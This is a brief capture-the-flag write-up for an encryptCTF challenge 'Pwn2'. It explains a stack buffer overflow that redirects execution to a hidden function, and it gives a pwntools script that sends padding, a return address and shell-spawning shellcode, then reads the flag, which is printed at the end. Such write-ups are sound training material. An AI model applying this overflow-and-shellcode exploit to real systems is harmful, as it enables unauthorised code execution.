# Pwn2
### 📄 Description
I made a simple shell which allows me to run some specific commands on my server can you test it for bugs?

## 🔑 Solution
What we can do to retrieve the flag is overflowing the buffer `buffer`, overwriting `main()` return address to be `lol()` function entrypoint. We'll also need to provide shellcode where lol stack base will be.

```python
from pwn import *

context.binary = "./pwn2"

p = process()

p.send(b"A" * 44)
p.p32(context.binary.functions["lol"].address + 3)
p.sendline(asm(shellcraft.sh()))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```

### 🚩 Flag
```plain
encryptCTF{N!c3_j0b_jump3R}
```